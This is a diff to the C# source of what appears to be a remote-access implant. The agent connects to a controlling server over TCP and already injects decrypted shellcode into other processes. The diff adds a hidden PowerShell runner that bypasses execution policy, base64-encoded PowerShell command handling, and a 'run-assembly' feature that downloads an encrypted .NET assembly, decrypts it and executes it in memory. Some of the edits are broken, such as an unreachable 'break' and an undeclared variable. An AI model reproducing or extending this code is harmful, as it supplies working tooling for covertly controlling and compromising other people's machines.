@@ -1,6 +1,5 @@
 
 
-
 using System;
 using System.IO;
 using System.Net;
@@ -12,7 +11,8 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net.Sockets;
 using System.Threading;
-
+using System.Reflection;
+using System.Linq;
 
 public class Win32
 {
@@ -132,7 +132,7 @@ public class Internals
 	{
 
 		// buffer to store the command response from the server
-		byte[] command_response_bytes = new Byte[256];
+		byte[] command_response_bytes = new Byte[4096];
 		// String to store the command response ASCII representation
 		String command_response_ascii = String.Empty;
 		// Read the first batch of the server response bytes
@@ -204,6 +204,19 @@ public class Internals
             		StreamReader reader = process.StandardOutput;
             		commandresult = reader.ReadToEnd();
 		        process.WaitForExit(0);
+        	}
+		return commandresult;
+	}
+	public static String PowerShell(string command)
+	{
+		String commandresult = "";
+		using (Process process = new Process())
+        	{
+            		process.StartInfo.FileName = "powershell.exe";
+	    		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+	    		process.StartInfo.Arguments = "-nop -ep bypass -w hidden -c " + command;
+            		process.StartInfo.UseShellExecute = false;
+            		process.Start();
         	}
 		return commandresult;
 	}
@@ -389,7 +402,7 @@ public class Internals
 					shellcode = AES_Decrypt(shellcode, password);
 					try
 					{
-
+						
 								InjectShellCode(pid, shellcode);
 
 					}
@@ -415,15 +428,64 @@ public class Internals
 		{
 			SendCommandResult(stream, "[!] the process you are trying to inject into does not running");
 		}
-
+		
 	}
+	public static void RunAssembly(Stream stream, string[] arguments)
+	{
+		
+		byte[] enc_bin;
+		try
+		{
+			enc_bin = Downloader(arguments[1]);
+			byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(arguments[2]));
+			try
+			{
+				byte[] dec_bin = AES_Decrypt(enc_bin, password);
+				try
+				{
+					object[] cmd = arguments.Skip(3).ToArray();
+					Assembly a = Assembly.Load(dec_bin);
+					try
+					{
+						a.EntryPoint.Invoke(null, new object[] { cmd });
+					}
+					catch
+					{
+						MethodInfo method = a.EntryPoint;
+						if (method != null)
+						{
+							object o = a.CreateInstance(method.Name);
+							method.Invoke(o, null);
+						}
+						
+						
+					}
+				}
+				catch
+				{
+					SendCommandResult(stream, "[!!!] something went wrong while loading the Assembly");	
+				}
+				
+			}
+			catch
+			{
+				SendCommandResult(stream, "[!!!] the password is wrong");
+			}
+			
+		}
+		catch
+		{
+			SendCommandResult(stream, "[!!!] the shellcode did not downloaded, check the url");
+		}
+	}
+	
 }
 
 
 public class Agent
 {
 
-	public static Session(String server, Int32 port)
+	public static bool Session(String server, Int32 port)
 	{
 		TcpClient agent = new TcpClient(server, port);
 
@@ -436,6 +498,7 @@ public class Agent
 			String[] command = Internals.RecvCommand(stream);
 			if (command[0] == "exit")
 			{
+				return false;
 				break;
 			}
 			// DownloadFile
@@ -522,10 +585,39 @@ public class Agent
 				}
 
 			}
+			else if (command.Length > 1 && command[0] == "run-assembly")
+			{
+				
+				try
+				{
+					Internals.RunAssembly(stream, command);
+					commandresult = "[+] done";
+				}
+				catch
+				{
+					commandresult = "[!] Something wrong with this feature";
+				}
+			}
+			else if (command.Length > 1 && command[0] == "powershell")
+			{
+				try
+				{
+					
+					byte[] data = Convert.FromBase64String(command[1]);
+					string decodedString = Encoding.UTF8.GetString(data);
+					
+					commandresult = Internals.PowerShell(decodedString);
+
+				}
+				catch
+				{
+					commandresult = "[!] Something while executing powershell";
+				}
+			}
+			
 			Internals.SendCommandResult(stream, commandresult);
 		}
 		Internals.CloseSession(agent, stream);
-		Environment.Exit(0);
 
 	}
 
@@ -534,11 +626,11 @@ public class Agent
 		int x = 0;
 		string ip = args[0];
 		int port = Int32.Parse(args[1]);
-		Session(ip, port);
+		is_live = Session(ip, port);
+
 
 	}
 
 }
-
 
 
